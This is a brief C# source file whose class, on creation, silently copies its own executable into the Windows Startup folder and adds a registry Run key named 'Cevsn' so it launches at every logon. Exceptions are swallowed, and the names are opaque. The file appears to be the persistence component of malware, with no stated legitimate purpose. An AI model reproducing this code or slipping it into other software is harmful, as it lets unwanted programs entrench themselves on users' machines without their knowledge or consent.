using Microsoft.Win32;

namespace cevsn
{
    public class Pevsn
    {
        public string Path = "C:\\Users\\Public\\AppData\\Roaming\\";
        public Pevsn()
        {
            Copyitself();
            StrtUp();
        }

        public void StrtUp()
        {
            RegistryKey key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true)!;
            key!.SetValue("Cevsn", AppDomain.CurrentDomain.BaseDirectory + "\\" + System.AppDomain.CurrentDomain.FriendlyName);
        }

         public static void Copyitself()
        {
            string thisFile = System.AppDomain.CurrentDomain.FriendlyName;

            string Path = AppDomain.CurrentDomain.BaseDirectory + "\\" +thisFile;

            string Filepath = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + thisFile;

            try
            {
                if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + thisFile))
                {
                    System.IO.File.Copy(System.Reflection.Assembly.GetEntryAssembly()!.Location, Filepath);
                }
            }
            catch (Exception) {      
            }

        }
    }
}